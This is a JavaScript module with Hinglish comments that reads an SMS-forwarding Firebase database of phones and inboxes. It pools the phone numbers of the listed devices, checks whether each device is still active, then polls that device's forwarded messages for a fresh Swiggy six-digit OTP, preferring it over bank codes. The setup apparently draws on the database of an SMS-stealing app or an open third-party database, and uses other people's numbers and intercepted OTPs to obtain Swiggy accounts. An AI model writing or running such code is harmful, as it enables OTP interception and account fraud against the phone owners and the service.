// ===== Firebase Realtime Database reader — number pool + SMS/OTP inbox =====
//
// Do structures support hote hain (auto-detect):
//
// A) ASLI SERVICE STRUCTURE (default — vuvhbjbi jaisa DB):
//   clients/<deviceId>   = { mobNo, sims:[{phoneNumber,...}], status(online), modelName, joined, ... }
//   messages/<deviceId>/<key> = { dateTime:"23-10-2026 | 04:48 AM", message, sender, type:"incoming" }
//   - Pool  = clients ke mobNo + sims (unique phones)
//   - OTP   = us device ke messages node me (key = epoch-ms ya legacy id)
//   - Device ONLINE flag = clients/<id>.status === true
//
// B) LEGACY FLAT STRUCTURE (agar FIREBASE_NUMBERS_PATH set ho):
//   numbers: [ "+919876543210", ... ] | { "+919876543210": {...} } | { "slot1": { phone, status } }
//   sms:     { "<number>": { pushId: { body, date } } } | flat { pushId: { phone, body, date } }
//   otp:     { "<number>": "123456" } | { "<number>": { code: "123456" } }
//
// Env:
//   FIREBASE_DB_URL        — required
//   FIREBASE_DB_AUTH       — optional (open rules wale DB me zaroorat nahi)
//   FIREBASE_CLIENTS_PATH  — default 'clients'
//   FIREBASE_MESSAGES_PATH — default 'messages'
//   FIREBASE_NUMBERS_PATH  — set kiya to LEGACY pool mode force
//   FIREBASE_SMS_PATH      — default 'sms' (legacy)
//   FIREBASE_OTP_PATH      — default 'otp' (fast path, dono modes me)
//
// Structure dump: node scratch/firebase-inspect.mjs

import { normalizeIndianMobileNumber } from './phone-utils.js';

const env = (key, dflt = '') => String(process.env[key] ?? dflt).trim();

// ---------------------------------------------------------------------------
// DYNAMIC SOURCE — bot UI se user khud Firebase switch/add kar sakta hai.
// Source set ho to ENV se upar priority; warna ENV (ya default) chalta hai.
// src = { url, auth?, clientsPath?, messagesPath?, numbersPath?, smsPath?, otpPath? }
// ---------------------------------------------------------------------------
let _source = null;

export function setFirebaseSource(src) {
  if (!src || typeof src !== 'object' || !String(src.url || '').trim()) {
    _source = null;
    return null;
  }
  _source = {
    url: String(src.url).trim().replace(/\/+$/, ''),
    auth: String(src.auth || '').trim(),
    clientsPath: String(src.clientsPath || 'clients').trim(),
    messagesPath: String(src.messagesPath || 'messages').trim(),
    numbersPath: String(src.numbersPath || '').trim(),
    smsPath: String(src.smsPath || 'sms').trim(),
    otpPath: String(src.otpPath || 'otp').trim(),
  };
  return _source;
}

export function getFirebaseSource() {
  return _source ? { ..._source } : null;
}

export function isFirebaseConfigured() {
  return Boolean(_source?.url || env('FIREBASE_DB_URL'));
}

export function firebaseSetupHintLines() {
  return [
    `! <b>Firebase config chahiye.</b>`,
    ``,
    `› <b>Set karein (Render → Env ya local .env):</b>`,
    `• <code>FIREBASE_DB_URL</code> — Realtime Database URL (required)`,
    `• <code>FIREBASE_DB_AUTH</code> — DB secret (agar rules open nahi hain)`,
    ``,
    `› <i>Default structure:</i> <code>clients</code> (pool) + <code>messages</code> (OTP inbox).`,
    `› <i>Dump:</i> <code>node scratch/firebase-inspect.mjs</code>`,
  ];
}

// ---------------------------------------------------------------------------
// URL building (query params + auth sahi tarah)
// ---------------------------------------------------------------------------
function baseUrl() {
  return (_source?.url || env('FIREBASE_DB_URL')).replace(/\/+$/, '');
}

function cleanPath(path) {
  return String(path || '').replace(/^\/+/, '').replace(/\/+$/, '');
}

function urlFor(path, params = {}) {
  const p = cleanPath(path);
  const qs = new URLSearchParams();
  for (const [k, v] of Object.entries(params || {})) {
    if (v === undefined || v === null || v === '') continue;
    qs.set(k, String(v));
  }
  const auth = _source ? _source.auth : env('FIREBASE_DB_AUTH');
  if (auth) qs.set('auth', auth);
  const q = qs.toString();
  return `${baseUrl()}/${p ? `${p}.json` : '.json'}${q ? `?${q}` : ''}`;
}

async function fbGet(path, params = {}) {
  // Timeout 30s — clients.json 1.2MB+ ka ho sakta hai; cold fetch ~11-15s
  // leta hai (12s par pehle TimeoutError aakar pool ko 0 bana deta tha).
  const res = await fetch(urlFor(path, params), { signal: AbortSignal.timeout(30_000) });
  if (!res.ok) {
    const txt = await res.text().catch(() => '');
    const hint = (res.status === 401 || res.status === 400)
      ? ' — FIREBASE_DB_URL/FIREBASE_DB_AUTH check karein'
      : '';
    throw new Error(`Firebase ${res.status} (GET ${cleanPath(path)})${hint} ${txt.slice(0, 120)}`);
  }
  return res.json();
}

async function fbPatch(path, obj) {
  const res = await fetch(urlFor(path), {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(obj),
    signal: AbortSignal.timeout(12_000)
  });
  if (!res.ok) {
    const txt = await res.text().catch(() => '');
    throw new Error(`Firebase ${res.status} (PATCH ${cleanPath(path)}) ${txt.slice(0, 120)}`);
  }
  return res.json().catch(() => null);
}

// ---------------------------------------------------------------------------
// Phone normalization (Indian numbers; leading-zero 11-digit bhi support)
// ---------------------------------------------------------------------------
export function normalizePoolPhone(value) {
  const norm = normalizeIndianMobileNumber(value);
  if (norm) return norm;
  const digits = String(value ?? '').replace(/\D/g, '');
  if (/^0[6-9]\d{9}$/.test(digits)) return digits.slice(1);
  if (/^91[6-9]\d{9}$/.test(digits)) return digits.slice(2);
  return null;
}

function phoneVariants(phone) {
  return [phone, `91${phone}`, `+91${phone}`, `0${phone}`];
}

const seg = (part) => encodeURIComponent(String(part));

// ---------------------------------------------------------------------------
// LEGACY pool parser (numbers path)
// ---------------------------------------------------------------------------
function poolEntryFrom(childKey, value) {
  let phone = null;
  let status = '';
  let label = '';

  if (value !== null && typeof value === 'object' && !Array.isArray(value)) {
    phone = normalizePoolPhone(
      value.number ?? value.phone ?? value.mobile ?? value.num ?? value.msisdn ?? value.value
    );
    status = String(value.status ?? value.state ?? '').trim();
    label = String(value.label ?? value.name ?? '').trim();
  } else if (typeof value === 'string' || typeof value === 'number') {
    phone = normalizePoolPhone(value);
  }
  if (!phone) phone = normalizePoolPhone(childKey);
  if (!phone) return null;

  return { phone, status, label, childKey: String(childKey), online: true, deviceId: '', noPatch: false };
}

export function _parsePool(raw) {
  if (raw === null || raw === undefined) return [];
  const out = [];
  const seen = new Set();

  const push = (entry) => {
    if (entry && !seen.has(entry.phone)) {
      seen.add(entry.phone);
      out.push(entry);
    }
  };

  if (Array.isArray(raw)) {
    raw.forEach((item, idx) => push(poolEntryFrom(idx, item)));
  } else if (typeof raw === 'object') {
    for (const [key, value] of Object.entries(raw)) push(poolEntryFrom(key, value));
  }
  return out;
}

// ---------------------------------------------------------------------------
// CLIENTS pool parser (asli structure — device profiles)
// ---------------------------------------------------------------------------
export function _parseClientsPool(raw) {
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return [];
  const out = [];
  const seen = new Set();

  for (const [deviceId, c] of Object.entries(raw)) {
    if (!c || typeof c !== 'object') continue;
    const label = String(c.modelName || c.service_provider || '').trim();
    const online = c.status === true;
    const joined = String(c.joined || '').trim();
    const candidates = [c.mobNo, c.mobile, c.number, ...(Array.isArray(c.sims) ? c.sims.map((s) => s?.phoneNumber) : [])];

    const localSeen = new Set();
    for (const rawNum of candidates) {
      const phone = normalizePoolPhone(rawNum);
      if (!phone || localSeen.has(phone)) continue;
      localSeen.add(phone);
      if (seen.has(phone)) continue;
      seen.add(phone);
      out.push({
        phone,
        deviceId: String(c.deviceId || deviceId),
        online,
        label,
        joined,
        status: '',          // clients pe koi used/skipped marker nahi (local ledger chalti hai)
        childKey: String(deviceId),
        noPatch: true,       // devices ke status field ko KABHI overwrite mat karo
      });
    }
  }
  return out;
}

// ---------------------------------------------------------------------------
// Device index (phone → deviceIds) — listPoolNumbers se cache hota hai
// ---------------------------------------------------------------------------
let _indexCache = { at: 0, byPhone: new Map() };

function rebuildIndex(pool) {
  const byPhone = new Map();
  for (const entry of pool) {
    if (!entry.deviceId) continue;
    if (!byPhone.has(entry.phone)) byPhone.set(entry.phone, new Set());
    byPhone.get(entry.phone).add(entry.deviceId);
  }
  _indexCache = { at: Date.now(), byPhone };
}

export async function findDeviceIdsForPhone(phone) {
  const cached = _indexCache.byPhone.get(phone);
  const fresh = Date.now() - _indexCache.at < 5 * 60_000;
  if (cached && fresh) return [...cached];
  try {
    const pool = await listPoolNumbers({ useCacheIndex: true });
    return [...(_indexCache.byPhone.get(phone) || [])];
  } catch {
    return cached ? [...cached] : [];
  }
}

// ---------------------------------------------------------------------------
// listPoolNumbers — clients (default) ya legacy numbers path
// ---------------------------------------------------------------------------
export async function listPoolNumbers({ useCacheIndex = false } = {}) {
  const forcedLegacy = _source ? _source.numbersPath : env('FIREBASE_NUMBERS_PATH', '');

  if (!forcedLegacy) {
    const clientsPath = _source?.clientsPath || env('FIREBASE_CLIENTS_PATH', 'clients');
    let raw = null;
    try {
      raw = await fbGet(clientsPath);
    } catch (e) {
      // 401/400 jaise config errors ko propagate karo; missing path (null) chalega
      if (/Firebase 40[01]/.test(String(e?.message || ''))) throw e;
      raw = null;
    }
    if (raw && typeof raw === 'object') {
      const pool = _parseClientsPool(raw);
      if (pool.length) {
        rebuildIndex(pool);
        return pool;
      }
    }
  }

  const legacyPath = _source?.numbersPath || env('FIREBASE_NUMBERS_PATH', 'numbers');
  const legacyRaw = await fbGet(legacyPath);
  const pool = _parsePool(legacyRaw);
  rebuildIndex(pool);
  return pool;
}

// clients pool me PATCH nahi karte (device ka status field bachao) — legacy me haan.
export async function markPoolNumberStatus(entry, status) {
  const key = typeof entry === 'object' ? entry?.childKey : entry;
  const noPatch = typeof entry === 'object' ? Boolean(entry?.noPatch) : false;
  if (!key || noPatch) return;
  const path = _source?.numbersPath || env('FIREBASE_NUMBERS_PATH', 'numbers');
  await fbPatch(`${cleanPath(path)}/${seg(key)}`, {
    status: String(status),
    statusAt: new Date().toISOString()
  });
}

// ---------------------------------------------------------------------------
// Message parsing
// ---------------------------------------------------------------------------
function messageBodyOf(v) {
  if (v === null || v === undefined) return '';
  if (typeof v === 'string') return v;
  if (typeof v === 'number') return String(v);
  if (typeof v === 'object') {
    return String(v.body ?? v.message ?? v.text ?? v.sms ?? v.msg ?? v.content ?? v.otpMessage ?? '');
  }
  return '';
}

export function _parseTs(t) {
  if (t === null || t === undefined || t === '') return null;
  if (typeof t === 'number' && Number.isFinite(t)) {
    if (t > 1e12) return t;               // epoch ms
    if (t > 1e9) return t * 1000;         // epoch seconds
    return null;
  }
  const s = String(t).trim();
  if (/^\d+$/.test(s)) return _parseTs(Number(s));
  const parsed = Date.parse(s);
  return Number.isFinite(parsed) ? parsed : null;
}

// Forwarder dateTime: "23-10-2026 | 04:48 AM" ya "06/10/2026 | 03:50 pm" (IST → epoch ms)
export function parseForwarderDateTime(t) {
  if (t === null || t === undefined || t === '') return null;
  if (typeof t === 'number') return _parseTs(t);
  const s = String(t).trim();
  const m = s.match(/^(\d{1,2})[/\-.](\d{1,2})[/\-.](\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)?$/i);
  if (!m) return _parseTs(s);
  const day = Number(m[1]);
  const month = Number(m[2]);
  const year = Number(m[3]);
  let hh = Number(m[4]);
  const mm = Number(m[5]);
  const ap = String(m[6] || '').toLowerCase();
  if (ap === 'pm' && hh < 12) hh += 12;
  if (ap === 'am' && hh === 12) hh = 0;
  if (day > 31 || month > 12 || hh > 23 || mm > 59) return null;
  // Forwarder phones IST par hain → UTC epoch me badlo (taaki abhi ke clock se compare ho)
  return Date.UTC(year, month - 1, day, hh, mm) - (5.5 * 3600 * 1000);
}

function messageTsOf(v) {
  if (!v || typeof v !== 'object') return null;
  const dt = parseForwarderDateTime(v.dateTime);
  if (dt) return dt;
  const t = v.date ?? v.timestamp ?? v.time ?? v.createdAt ?? v.created_at ?? v.at ?? v.ts ?? v.sentAt;
  return _parseTs(t);
}

// Swiggy wale line ko prefer karte hue standalone 6-digit code nikalna.
// (Sirf MESSAGE text se — sender line me digits ho sakte hain, e.g. "JX-620014-P")
export function _extractSixDigitCode(text) {
  const src = String(text ?? '');
  if (!src) return '';
  const pick = (s) => (s.match(/(?<!\d)\d{6}(?!\d)/) || [])[0] || '';
  const swiggyLine = src.split(/\r?\n/).find((l) => /swiggy/i.test(l)) || '';
  return pick(swiggyLine) || pick(src);
}

function candidateFrom(idKey, v, via, meta = '') {
  const body = messageBodyOf(v);
  const code = _extractSixDigitCode(body);
  if (!code) return null;
  return { idKey, code, ts: messageTsOf(v), body, meta, via };
}

// ---------------------------------------------------------------------------
// OTP candidates
// ---------------------------------------------------------------------------
export async function fetchOtpCandidates(phone, opts = {}) {
  const out = [];
  const messagesPath = cleanPath(_source?.messagesPath || env('FIREBASE_MESSAGES_PATH', 'messages'));

  // 1) PRIMARY — device messages node (asli forwarder structure)
  let deviceIds = Array.isArray(opts.deviceIds) && opts.deviceIds.length
    ? opts.deviceIds
    : await findDeviceIdsForPhone(phone);

  for (const deviceId of deviceIds) {
    let node = null;
    try {
      node = await fbGet(`${messagesPath}/${seg(deviceId)}`, { orderBy: '"$key"', limitToLast: 50 });
    } catch { node = null; }
    if (!node) continue;
    const entries = Array.isArray(node)
      ? node.map((m, i) => [i, m])
      : (typeof node === 'object' ? Object.entries(node) : []);
    for (const [k, m] of entries) {
      const sender = m && typeof m === 'object' ? String(m.sender || '') : '';
      const c = candidateFrom(`messages/${deviceId}/${k}`, m, 'device', sender);
      if (c) out.push(c);
    }
  }

  // 2) FAST PATH — seedha OTP code likhne wale forwarder ke liye: otp/<number>
  const otpPath = cleanPath(_source?.otpPath || env('FIREBASE_OTP_PATH', 'otp'));
  for (const variant of phoneVariants(phone)) {
    let node = null;
    try { node = await fbGet(`${otpPath}/${seg(variant)}`); } catch { node = null; }
    if (node === null || node === undefined) continue;
    if (node && typeof node === 'object' && !Array.isArray(node)) {
      const inner = node.code ?? node.otp ?? node.value ?? null;
      if (inner !== null && inner !== undefined) {
        const c = candidateFrom(`otp:${variant}`, inner, 'otp');
        if (c) out.push(c);
      } else {
        for (const [k, v] of Object.entries(node)) {
          const c = candidateFrom(`otp:${variant}/${k}`, v, 'otp');
          if (c) out.push(c);
        }
      }
    } else {
      const c = candidateFrom(`otp:${variant}`, node, 'otp');
      if (c) out.push(c);
    }
  }

  // 3) LEGACY sms path (purane shapes)
  const smsPath = cleanPath(_source?.smsPath || env('FIREBASE_SMS_PATH', 'sms'));
  for (const variant of phoneVariants(phone)) {
    let node = null;
    try { node = await fbGet(`${smsPath}/${seg(variant)}`); } catch { node = null; }
    if (node === null || node === undefined) continue;
    if (Array.isArray(node)) {
      node.forEach((m, i) => {
        const sender = m && typeof m === 'object' ? String(m.sender || '') : '';
        const c = candidateFrom(`sms/${variant}/${i}`, m, 'sms', sender);
        if (c) out.push(c);
      });
    } else if (typeof node === 'object') {
      if (looksLikeMessageNode(node)) {
        const c = candidateFrom(`sms/${variant}`, node, 'sms', String(node.sender || ''));
        if (c) out.push(c);
      } else {
        for (const [k, v] of Object.entries(node)) {
          const c = candidateFrom(`sms/${variant}/${k}`, v, 'sms', v && typeof v === 'object' ? String(v.sender || '') : '');
          if (c) out.push(c);
        }
      }
    } else {
      const c = candidateFrom(`sms/${variant}`, node, 'sms');
      if (c) out.push(c);
    }
  }

  // 4) LEGACY flat fallback — { pushId: { phone, body, date } }
  if (!out.length) {
    let flat = null;
    try { flat = await fbGet(smsPath); } catch { flat = null; }
    const entries = Array.isArray(flat)
      ? flat.map((m, i) => [i, m])
      : (flat && typeof flat === 'object' ? Object.entries(flat) : []);
    for (const [k, v] of entries) {
      if (!v || typeof v !== 'object') continue;
      const entryPhone = normalizePoolPhone(v.phone ?? v.number ?? v.from ?? v.sender ?? v.address ?? v.msisdn ?? v.mobile);
      if (!entryPhone || entryPhone !== phone) continue;
      const c = candidateFrom(`sms/${k}`, v, 'sms', String(v.sender || ''));
      if (c) out.push(c);
    }
  }

  return out;
}

function looksLikeMessageNode(node) {
  if (!node || typeof node !== 'object' || Array.isArray(node)) return false;
  const keys = Object.keys(node);
  return keys.some((k) => ['body', 'message', 'text', 'sms', 'msg', 'content', 'otpMessage'].includes(k)) ||
    keys.some((k) => ['date', 'timestamp', 'time', 'createdAt', 'at', 'ts', 'sentAt', 'dateTime'].includes(k));
}

// ---------------------------------------------------------------------------
// Device "last seen" — is DB me clients/ ke andar koi heartbeat/lastSeen
// field NAHI hai (live verify kiya: fields sirf status/battery/joined/...).
// Device zinda hai ya nahi, iska ekmatra saboot hai uske messages node ki
// SABSE TAAZI entry: epoch-ms wali key (13-digit) ya message ki dateTime.
// OTP bhejne se pehle isi se decide hoga ke device abhi active hai ya nahi —
// mare hue device par OTP bhejkar 100s wait + rate-limit burn, dono bachega.
// ---------------------------------------------------------------------------
export async function fetchDeviceLastActivityMs(deviceId) {
  if (!deviceId) return null;
  const messagesPath = cleanPath(_source?.messagesPath || env('FIREBASE_MESSAGES_PATH', 'messages'));
  let node = null;
  try {
    node = await fbGet(`${messagesPath}/${seg(deviceId)}`, { orderBy: '"$key"', limitToLast: 50 });
  } catch { return null; }
  if (!node || typeof node !== 'object') return null;
  const entries = Array.isArray(node) ? node.map((m, i) => [i, m]) : Object.entries(node);
  let best = null;
  for (const [k, v] of entries) {
    const keyTs = _parseTs(k); // sirf epoch-ms keys (>1e12) pass hongi, chhote inbox ids nahi
    const msgTs = (v && typeof v === 'object') ? messageTsOf(v) : null;
    const ts = Math.max(keyTs || 0, msgTs || 0) || null;
    if (ts && (!best || ts > best)) best = ts;
  }
  return best;
}

// OTP dispatch se PEHLE inbox ka snapshot — purane messages kabhi accept na hon.
// { ids: Set<idKey>, codes: Set<6-digit> }
export async function snapshotSeenOtpState(phone, opts = {}) {
  try {
    const cands = await fetchOtpCandidates(phone, opts);
    return {
      ids: new Set(cands.map((c) => c.idKey)),
      codes: new Set(cands.map((c) => c.code))
    };
  } catch {
    return { ids: new Set(), codes: new Set() };
  }
}

function normalizeExclude(exclude) {
  if (exclude instanceof Set) return { ids: exclude, codes: new Set() };
  if (exclude && typeof exclude === 'object') {
    return {
      ids: exclude.ids instanceof Set ? exclude.ids : new Set(exclude.ids || []),
      codes: exclude.codes instanceof Set ? exclude.codes : new Set(exclude.codes || [])
    };
  }
  return { ids: new Set(), codes: new Set() };
}

const isSwiggyCand = (c) => /swiggy/i.test(`${c.body || ''} ${c.meta || ''}`);

function pickBestCandidate(cands, exclude, sinceTs, acceptAnyAfter) {
  const now = Date.now();
  const fresh = cands.filter((c) => {
    if (!exclude.ids.has(c.idKey)) return true;              // bilkul naya entry
    if (c.ts && c.ts >= sinceTs) return true;                // overwrite wala node naya message
    if (exclude.codes.size > 0 && !exclude.codes.has(c.code)) return true; // pehle wale code se alag = naya OTP
    if (exclude.codes.size === 0 && exclude.ids.size === 0) return true;   // khali snapshot = pehla message
    return false;
  });
  if (!fresh.length) return null;

  // Swiggy wale message ko hamesha prefer karo; non-Swiggy (bank/waghera) sirf
  // tab jab tak Swiggy ka message hi na aa jaye aur thoda time guzar chuka ho.
  const swiggy = fresh.filter(isSwiggyCand);
  if (swiggy.length) {
    return swiggy.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
  }
  if (acceptAnyAfter && now < acceptAnyAfter) return null;
  return fresh.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
}

// Swiggy OTP dispatch se PEHLE call karo. Pehle `waitMs` (default 10s), phir
// `timeoutMs` tak har `pollMs` pe Firebase padho. Milne par {code,...} warna {code:''}.
export async function waitForOtpCode(phone, opts = {}) {
  const waitMs = Number(opts.waitMs ?? 10_000);
  const timeoutMs = Number(opts.timeoutMs ?? 90_000);
  const pollMs = Number(opts.pollMs ?? 2_500);
  const acceptAnyAfterMs = Number(opts.acceptAnyAfterMs ?? 30_000);
  const exclude = normalizeExclude(opts.excludeIds ?? opts.exclude);
  const shouldAbort = typeof opts.shouldAbort === 'function' ? opts.shouldAbort : null;
  const sinceTs = typeof opts.sinceTs === 'number' ? opts.sinceTs : Date.now() - 20_000;
  const startedAt = Date.now();

  const bail = () => shouldAbort && shouldAbort();
  if (bail()) return { code: '', aborted: true };
  if (waitMs > 0) await new Promise((r) => setTimeout(r, waitMs));
  if (bail()) return { code: '', aborted: true };

  const deadline = Date.now() + timeoutMs;
  const acceptAnyAfter = Date.now() + acceptAnyAfterMs;
  let lastErr = null;

  for (;;) {
    try {
      const cands = await fetchOtpCandidates(phone, { deviceIds: opts.deviceIds });
      const best = pickBestCandidate(cands, exclude, sinceTs, acceptAnyAfter);
      if (best) {
        return { code: best.code, via: best.via, ts: best.ts, idKey: best.idKey };
      }
    } catch (e) {
      lastErr = e;
    }
    if (bail()) return { code: '', aborted: true };
    if (Date.now() >= deadline) {
      return lastErr ? { code: '', error: lastErr.message } : { code: '' };
    }
    await new Promise((r) => setTimeout(r, pollMs));
  }
}
